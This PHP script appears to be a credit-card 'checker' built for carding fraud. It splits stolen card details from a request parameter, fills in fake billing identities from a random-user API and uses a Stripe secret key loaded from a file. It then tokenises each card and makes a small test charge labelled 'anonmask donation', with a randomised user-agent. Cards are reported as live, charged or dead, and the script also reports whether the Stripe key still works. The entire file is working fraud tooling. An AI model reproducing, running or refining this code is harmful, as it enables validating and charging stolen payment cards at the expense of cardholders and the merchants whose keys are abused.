<?php
 

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Tokyo');
$time = date('m/d/Y h:i a', time());

$amount = 0.8;
$sk_file = file("proxy.txt.txt");
$get_sk = end($sk_file); 
$sk= trim($get_sk);
if(isset($_GET['amount'])){
$amount = $_GET['amount'];
}
$cur ="$";
$anonmask = array("currency"=>"usd", "desc"=>"anonmask donation", "currency_symbol"=>$cur,"amount"=>$amount ==="min" ? 50 : $amount * 100, "country"=>"India", "sk"=>$sk);


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$lista = $_GET['lista'];
$cc = multiexplode(array(":", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", " ", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
return "";}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));}
function mod($dividendo,$divisor){
return round($dividendo - (floor($dividendo/$divisor)*$divisor));}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch); 
$emoji = GetStr($fim, '"emoji":"', '"'); 
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $type - $brand - $country $emoji"; 

        $get = file_get_contents('https://randomuser.me/api/1.3/?nat='.$country.'');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]='.$street.'200&card[address_line2]=Apartment&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]='.$country.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r1 = curl_exec($ch);
$tok = trim(strip_tags(getstr($r1,'"id": "','"')));


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[email]='.$email.'&source='.$tok.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r2 = curl_exec($ch);
$cus = trim(strip_tags(getstr($r2,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$cus.'&description='.$anonmask['desc'].'&amount='.$anonmask['amount'].'&currency='.$anonmask['currency'].'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r3 = curl_exec($ch);
$charge = trim(strip_tags(getstr($r3,'"id": "','"')));
$check3 = trim(strip_tags(getStr($r3,'"cvc_check": "','"')));
$msg3 = trim(strip_tags(getStr($r3,'"message": "','"')));
$d_code3 = trim(strip_tags(getStr($r3,'"decline_code": "','"')));
$receipturl = trim(strip_tags(getStr($r3,'"receipt_url": "','"')));
$networkstatus = trim(strip_tags(getStr($r3,'"network_status": "','"')));
$risklevel = trim(strip_tags(getStr($r3,'"risk_level": "','"')));
$seller_message = trim(strip_tags(getStr($r3,'"seller_message": "','"')));


if (strpos($r3, '"seller_message": "Payment complete."')){
$status = '<font color=blue>#pprove CVV<br></font>';
$resmsg = $cur.$amount.' <font color=blue>Charged!</font> ';
echo ' <p class="uk-margin-small-top">'.$status.' : '.$resmsg.' : ' . $lista . ' : '.$country.' : <a class="receipt" href="'.$receipturl.'">Get Receipt</a> - </p>'
.$risklevel ='';
exit;
}elseif ((strpos($r2,'insufficient_funds')) || (strpos($r3,'insufficient_funds'))){
$status = 'Approve CVV';
$resmsg = '<font color=lime>INSUFFICIENT FUND</font>';


}elseif (strpos($r3, "incorrect_cvc") || strpos($r2, "incorrect_cvc")) {
$status = '<font color=yellow>Approve CCN<br></font>';
$resmsg = '<font color=blue>INCORRECT CVC</font><br>'.$risklevel.'';
}
elseif (strpos($r1, 'generic_decline')){
$status = '<font color=blue>OTP</font><br>';
$resmsg = '<font color=blue>CHARGED CANCELED</font><br><font color=orange>TRIAL SITE ONLY</font><br>'.$risklevel.'';
}

elseif (strpos($r1, 'test_mode_live_card')){
$status = '<font color=red>RESULT</font><br>';
$resmsg = '<font color=red>TEST_MODE LIVE_CARD</font><br>'.$risklevel.'';
}

elseif (strpos($r1, 'testmode_charges_only')){
$status = '<font color=red>STATUS</font><br>';
$resmsg = '<font color=red>TEST_MODE CHARGE ONLY</font><br>'.$risklevel.'';
}

elseif(strpos($r1, "invalid_request_error" )) {
$status = '<font color=red>DEAD</font><br>';
$resmsg = '<font color=red>™INVALID REQUEST ERROR™<br>CARD IS INCORRECT</font><br>'.$risklevel.'';
}

elseif(strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe" )) {
$status = '<font color=red>INVALID REQUEST</font><br>';
$resmsg = '<font color=red>YOUR SK is DEAD</font><br>'.$risklevel.'';
}

elseif(strpos($r1, "api_key_expired" )) {
$status = '<font color=red>STATUS</font>';
$resmsg = '<font color=red>YOUR API KEY EXPIRED</font><br>'.$risklevel.'';
}

else {
$status = '<font color=red>DECLINED<br></font>';
$resmsg = '<font color=red></font>'.$risklevel.'';

}
    echo '<p class="uk-margin-small-top"><font color=yellow>'.$status.''.$lista .'<br>'. $bindata1.''.$resmsg.'<font color=red>'.$d_code3.'</font>';


curl_close($ch);
ob_flush();

?>
